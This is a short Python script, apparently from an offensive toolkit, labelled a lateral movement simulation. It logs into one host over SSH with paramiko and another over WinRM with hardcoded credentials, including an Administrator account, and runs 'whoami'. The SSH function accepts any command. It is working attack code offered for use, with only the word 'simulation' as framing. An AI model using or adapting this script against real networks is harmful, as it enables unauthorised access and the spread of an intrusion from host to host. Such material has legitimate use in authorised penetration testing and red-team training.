import os
import paramiko
import subprocess
import time

def ssh_move(target_ip, username, password, command="whoami"):
    print(f"[+] Attempting SSH lateral move to {target_ip}...")
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username=username, password=password, timeout=5)
        stdin, stdout, stderr = ssh.exec_command(command)
        result = stdout.read().decode().strip()
        print(f"[✔] SSH command output: {result}")
        ssh.close()
        return result
    except Exception as e:
        print(f"[-] SSH lateral movement failed: {e}")
        return None

def winrm_move(target_ip, username, password):
    try:
        import winrm
    except ImportError:
        print("[-] winrm not installed. Run: pip install pywinrm")
        return

    print(f"[+] Attempting WinRM move to {target_ip}...")
    try:
        session = winrm.Session(target_ip, auth=(username, password))
        r = session.run_cmd('whoami')
        print(f"[✔] WinRM command output: {r.std_out.decode().strip()}")
    except Exception as e:
        print(f"[-] WinRM failed: {e}")

def lateral_movement(target=None):
    print(f"\n=== Lateral Movement Simulation ===")

    # SSH move
    ssh_move("192.168.1.101", "user", "password123")

    # Windows move
    winrm_move("192.168.1.102", "Administrator", "Password123")

    print("[+] Lateral movement simulation complete.")

# Standalone
if __name__ == "__main__":
    lateral_movement()
